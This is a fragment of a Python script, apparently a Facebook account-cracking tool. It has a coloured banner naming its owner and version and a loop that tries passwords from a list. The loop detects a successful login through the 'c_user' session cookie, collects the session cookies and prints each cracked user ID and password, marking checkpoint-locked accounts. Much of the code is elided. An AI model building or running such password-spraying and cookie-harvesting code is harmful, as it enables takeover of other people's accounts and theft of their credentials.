...
logo = ("""
 ...
 \033[1;93m║     \033[1;96m[✓] tools owner BY\33[0;m   : \033[1;96m Shohag-Khan     \033[1;32m║
 ...
 \033[1;93m║     \033[1;36m[✓] TOOL VIRSION :  \033[1;36m0.5                  \033[1;32m ║
 \033[1;93m║᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱ \033[1;32m║
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;35m [Lock-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;95m')
